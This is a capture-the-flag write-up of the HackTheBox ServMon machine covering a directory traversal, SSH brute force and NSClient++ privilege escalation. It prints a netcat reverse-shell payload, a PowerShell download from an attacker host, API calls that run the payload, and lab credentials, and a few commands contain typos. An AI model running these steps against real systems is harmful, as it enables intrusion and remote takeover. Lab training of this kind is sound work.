---
layout: post
author: Rajat Rao
title: HackTheBox ServMon Writeup
date: 2020-06-21T09:52:20.613Z
thumbnail: /assets/img/posts/HTB/ServMon/card.png
category: HTB
summary: HackTheBox ServMon Writeup
---

## Brief
&nbsp; &nbsp; On enumerating different services of `ServMon` machine, we were able to find few confidentail files from `FTP` service which disclosed a hint saying that a file consisting of passwords being stored in `Nathan` users desktop. On exploring port 80, we were able to discover a Network Surveillance Management Software i.e. `NVMS-1000`. Assessing the software, it was vulnerable to `Directory Traversal` vulnerability which helped us to conquer the `Passwords.txt` from `Nathan's` desktop by using exploit available on exploit-db.As we have got a list of passsword and two usersnames ( `Nathan` and `Nadine` ), we try to brute force the available `SSH` service on target machine using `Hydra`. Brute Forcing helped us to find credentails of `nadine` and taking leverage of it, we ssh'ed to the machine using `nadine` cracked password and get `user.txt`. Once we got the local access, enumeration helped us to find `NSClient++` running and on exploitation of it using publicly available script, we were able to get maximum level of privelege and get `root.txt`.


&nbsp;

## Flow
- `Anonymous FTP` reveals `Confidential.txt` file from `Nadine` folder sharing a hint of `Passwords.txt` being stored in `Nathan's` desktop.

- Exploiting `NVMS-1000's Directory Traversal` vulneability available on port 80 to get `Passwords.txt` file using script from `exploit-db`

- Brute force `SSH` service using two usernames `Nathan` and `Nadine` against `Passwords.txt` using `hydra`

- Login as `nadine` on `SSH` service with credentials found via `hydra` ( `nadine:L1k3B1gBut7s@W0rk` )

- Get `user.txt`

- Local enumeration discloses usage of `NSClient++` and also `nmap` ( **8443** ) report discloses the same in target machine

- Search for `NSClient ++` leads to publicly available writeup ( `exploit-db` ) to escalate the privilege.

- Follow steps provided in write-up

- Get `root.txt`

&nbsp;

Below is a detail writeup of the machine following the below steps:

1. [Information Gathering]({{site.url}}/hackthebox/2020/06/05/HackTheBox-Monteverde/#informationgathering)

2. [Low-Privilege Shell]({{site.url}}/hackthebox/2020/06/05/HackTheBox-Monteverde/#lowprivilegeshell)

3. [Privilege Escalation]({{site.url}}/hackthebox/2020/06/05/HackTheBox-Monteverde/#privilegeescaltion)

<p id="informationgathering">&nbsp;</p>

## 1. Information Gathering 
### 1.1 || Nmap 

-> `Run nmap`
```yml
$ nmap -sC -sV -p- -oA full 10.10.10.184
```
where, 

&nbsp; &nbsp; **-sC** : Run Default Scripts

&nbsp; &nbsp; **-sV** : Enumerate different versions

&nbsp; &nbsp; **-sA** : Store the output in all format (.nmap, .xml and .gnmap) having name full

**Result:**

```yml

# Nmap 7.80 scan initiated Sat May  2 17:07:00 2020 as: nmap -sC -sV -oA tcp 10.10.10.184
Nmap scan report for 10.10.10.184
Host is up (0.22s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
  ftp-anon: Anonymous FTP login allowed (FTP code 230)
 _01-18-20  12:05PM       <DIR>          Users
  ftp-syst: 
 _  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
  ssh-hostkey: 
    2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
    256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
 _  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp   open  http
  fingerprint-strings: 
    GetRequest, HTTPOptions, RTSPRequest: 
      HTTP/1.1 200 OK
      Content-type: text/html
      Content-Length: 340
      Connection: close
     AuthInfo: 
      <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
      <html xmlns="http://www.w3.org/1999/xhtml">
      <head>
      <title></title>
      <script type="text/javascript">
      window.location.href = "Pages/login.htm";
      </script>
      </head>
      <body>
      </body>
      </html>
    NULL: 
      HTTP/1.1 408 Request Timeout
      Content-type: text/html
      Content-Length: 0
      Connection: close
 _    AuthInfo:
 _http-title: Site doesn't have a title (text/html).
 _http-trane-info: Problem with XML parsing of /evox/about
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
  fingerprint-strings: 
    FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
      HTTP/1.1 404
      Content-Length: 18
      Document not found
    GetRequest: 
     HTTP/1.1 302
      Content-Length: 0
      Location: /index.html
      urday
      workers
 _    jobs
  http-title: NSClient++
 _Requested resource was /index.html
  ssl-cert: Subject: commonName=localhost
  Not valid before: 2020-01-14T13:24:20
 _Not valid after:  2021-01-13T13:24:20
 _ssl-date: TLS randomness does not represent time
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
			NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.80%I=7%D=5/2%Time=5EAD5B9B%P=x86_64-pc-linux-gnu%r(NULL,
SF:6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/htm
SF:l\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\
SF:r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text
SF:/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x2
SF:0\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XH
SF:TML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DT
SF:D/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.o
SF:rg/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x
SF:20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20
SF:\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%
SF:r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html
SF:\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
SF:\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x
SF:201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xht
SF:ml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/19
SF:99/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x2
SF:0\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\
SF:x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RTS
SF:PRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nC
SF:ontent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\
SF:xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.
SF:0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-t
SF:ransitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xh
SF:tml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20
SF:<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x
SF:20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=5/2%Time=5EAD5BA3%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation:
SF:\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\x1d\x02\0\0\0\0\0\0\x1d\x0
SF:2\0\0urday\0\0\x12\x02\x18\0\x1aE\n\x07workers\x12\x0b\n\x04jobs\x12\x0
SF:3\x18\xbb\x01\x12")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Lengt
SF:h:\x2018\r\n\r\nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP
SF:/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")
SF:%r(RTSPRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDoc
SF:ument\x20not\x20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Le
SF:ngth:\x2018\r\n\r\nDocument\x20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
 _clock-skew: 3m07s
  smb2-security-mode: 
    2.02: 
 _    Message signing enabled but not required
  smb2-time: 
    date: 2020-05-02T11:43:32
 _  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May  2 17:11:06 2020 -- 1 IP address (1 host up) scanned in 246.55 seconds

```
&nbsp;

### 1.2 || FTP

Nmap result shows us that it has `FTP` service running and on detecting `Anonymous FTP`, we were able to get FTP access of the machine. `Anonymous FTP` reveals a file named `Confidential.txt` which gives us hint of a `Passwords.txt` file being stored in `Nathane's` Desktop.

-> `FTP access`

```yml
$ ftp 10.10.10.184
```
![deploy using travis](/assets/img/posts/HTB/ServMon/1.png){:class="img-fluid"}  

![deploy using travis](/assets/img/posts/HTB/ServMon/2.png){:class="img-fluid"}  


**Confidential.txt**

![deploy using travis](/assets/img/posts/HTB/ServMon/3.png){:class="img-fluid"} 

&nbsp;

### 1.3 || NVMS-1000 (Port 80)

On exploring port 80, we were able to discover a Network Surveillance Management Software i.e. `NVMS-1000`. Exploit-db suggests an exploit of `NVMS-1000` being vulnerable to `Directory Traversal` attack.

**POC**: [https://www.expxloit-db.com/exploits/48311](https://www.expxloit-db.com/exploits/48311)


![deploy using travis](/assets/img/posts/HTB/ServMon/4.png){:class="img-fluid"}  

Executing the script by providing proper parameters as shown in below picture results in access of `Passwords.txt` from `Nathan's` desktop.

```yml
$ python 48311.py http://10.10.10.184/ /Users/Nathan/Desktop/Passwords.txt passwords_list.txt
```

![deploy using travis](/assets/img/posts/HTB/ServMon/5.png){:class="img-fluid"}  

&nbsp;

## 2. Low-Privilege Shell 

Once we have acquired the password file, ideally, any pentester would go for `Brute Forcing` methodology as we have two usernames ( `Nathane` and `Nadine` ) and a password file. 

Using [Hydra]() for brute forcing the `SSH` service, we successfully pwned one of the users ( `Nadine` ) password

-> `Run Hydra`

```yml
$ hydra -l nadine -P passwords.txt 10.10.10.182
```

![deploy using travis](/assets/img/posts/HTB/ServMon/6.png){:class="img-fluid"}  

-> `SSH login to get Low-Privilege Shell`

As we were successfully able to retrieve password of `Nadine`, we'll login as `Nadine` via `SSH` service and complete one of the challegenes of the machine i.e. acquire user.txt file.

```yml
$ ssh 10.10.10.184
```
![deploy using travis](/assets/img/posts/HTB/ServMon/7.png){:class="img-fluid"}  

-> `Get user.txt`

![deploy using travis](/assets/img/posts/HTB/ServMon/8.png){:class="img-fluid"}  

&nbsp;

## 3. Privilege Escalation

### 3.1 || Enumerate local system

Our next step to get maximum level of privilege and in the process od doing so, we were able to discover the target machines uses `NSClient ++`. This service was also discovered via nmap output ( `8443` .)

**Port 8443**

![deploy using travis](/assets/img/posts/HTB/ServMon/9.png){:class="img-fluid"}  


On searching for exploits with respect to `NSClient ++`, we were able to find a writeup on exploit-db to escalte the privilege by exploiting `NSClient ++` vulenrability.

**NSClient ++ writeup on exploit-db**: [https://www.expxloit-db.com/exploits/46802](https://www.expxloit-db.com/exploits/46802)

![deploy using travis](/assets/img/posts/HTB/ServMon/10.png){:class="img-fluid"}  

&nbsp;

### 3.2 ||  NSClient ++ Exploitation Steps

-> `Step 1: Grab Web Admin Password`

Navigate to `C:\Program Files\NSClient++` folder and execute the below command:

```yml
$ nscp.exe web --password --display
```
![deploy using travis](/assets/img/posts/HTB/ServMon/11.png){:class="img-fluid"}  

-> `Step 2: Enable CheckExternalScript & Scheduler`

On checking the configuration file ( `nsclient.ini` ), `CheckExternalScript` & `Scheduler` were enabled already.

![deploy using travis](/assets/img/posts/HTB/ServMon/12.png){:class="img-fluid"}  

![deploy using travis](/assets/img/posts/HTB/ServMon/13.png){:class="img-fluid"}  

-> `Step 3: Create Payload`

As per the exploit poc, we are supposed to create a `.bat` consisting of the below payload and add as an external script to `NSClient++` service.

```yml
@echo off
C:\temp\nc.exe 10.10.15.137 443 -e cmd.exe
```
where,

&nbsp; &nbsp; **10.10.15.137**: Listening Host ( Attacking machine's IP address)

&nbsp; &nbsp; **443**: Listening Port ( Attacking machine's listening port)


**Commands Issued**

```yml
$ echo @off > evilish.bat
$ echo C:\Temp\nc.exe 10.10.15.137 443 -e cmd.exe >> evilish.bat
```
![deploy using travis](/assets/img/posts/HTB/ServMon/14.png){:class="img-fluid"}  

Adding an external script can be acheived by logging in via the web portal availble on port `8443`. However, for some strange reason, the web portal seemt to be very unstable and hence, we'll be using `API` available in documentation of [NSClient_++]() via using curl commands locally.

Under the `Scripts` section of API documentation, we were able to discover a method to add an external script via command line. 

![deploy using travis](/assets/img/posts/HTB/ServMon/15.png){:class="img-fluid"}  

Below is the issued command:

```yml
curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/check_new.bat --data-binary @evilish.bat
```
![deploy using travis](/assets/img/posts/HTB/ServMon/16.png){:class="img-fluid"}  

On using the above command, it prompts for a password. The password to be used is password discovered in **Step 1** ( `ew2x6SsGTxjRwXOT` )

-> `Step 4: Download nc.exe to target machine`

There are multiple ways to download a file from attacking machince to target machine. In this machine, we'll be using below command to download:

```yml
$ powershell.exe "IEX(New-Object Ssytem.Net.WebClient).DownloadFile('http://10.10.15.137:8081/nc.exe','C:\Temp\nc.exe')
```
where,

&nbsp; &nbsp; **http://10.10.15.137:8081/nc.exe**: IP Path of nc.exe hosted on attacking machine

&nbsp; &nbsp; **C:\Temp\nc.exe**: Output path and filename of the downloaded file

Before issuing the above command, it is necessary to host the `nc.exe` file first on attacking machine by using the below command:

```yml
$ python -m SimpleHTTPServer 8081
```

-> `Step 5: Execute the payload`

To get a privileged shell, we need to execute the payload  created earlier. Under `Query` section of API documentation, we can execute the external script uploaded earlier.

![deploy using travis](/assets/img/posts/HTB/ServMon/17.png){:class="img-fluid"}  

**Command Issued:**
```yml
$ curl -s -k -u admin https://1ocalhost:8443/api/v1/queries/check_new/commands/execute?time=3m
```

![deploy using travis](/assets/img/posts/HTB/ServMon/18.png){:class="img-fluid"}  

&nbsp;

### 3.2 || Privileged Shell

Before performing `Step 5` from the previous section, we need to create a listener at our attacking machine. Below is the command used to use for getting a reverse shell:

```yml
$ nc -lvnp 443
```
Once the listener is set, we can execute the payload and get a reverse shell with admin privileges.

![deploy using travis](/assets/img/posts/HTB/ServMon/20.png){:class="img-fluid"}  

&nbsp;

### 3.3 || root.txt

![deploy using travis](/assets/img/posts/HTB/ServMon/21.png){:class="img-fluid"}  

&nbsp;

## Key Takeway:

As the main motto to build HackTheBox platform for security researchers is to help us hone our testing skills and hence, every machine has its key takeways.

For me, the key takeway was services discovered via nmap also runs on localhost in the target machine. As explained above, `NSClient++` web portal was unstable and hence, we had to attack via command line against localhost.


